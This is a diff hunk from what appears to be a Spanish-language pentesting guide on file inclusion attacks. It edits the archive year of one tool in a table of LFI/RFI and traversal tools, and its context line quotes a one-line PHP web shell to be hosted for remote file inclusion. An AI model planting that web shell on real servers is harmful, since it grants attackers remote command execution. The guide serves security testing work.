@@ -126,7 +126,7 @@ Web shell mínimo a alojar: `<?php system($_GET['cmd']); ?>`. Para reverse shell
 | **nuclei** | Go | ✅ Activa | Scanning masivo + CVEs |
 | **interactsh** | Go | ✅ Activa | OOB blind RFI/SSRF |
 | **dotdotpwn** | Perl | 🟡 Legado (en Kali) | Traversal multi-protocolo (FTP/SMB) |
-| **kadimus** | C | ❌ Archivada (2022) | — no usar |
+| **kadimus** | C | ❌ Archivada (2020) | — no usar |
 | **LFISuite** | Python 2 | ❌ Abandonada | — no usar |
 | **fimap** | Python 2 | ❌ Abandonada | — no usar |
 | **liffy** | Python 3 (fork) | ⚠️ Incierta | Preferir LFImap |
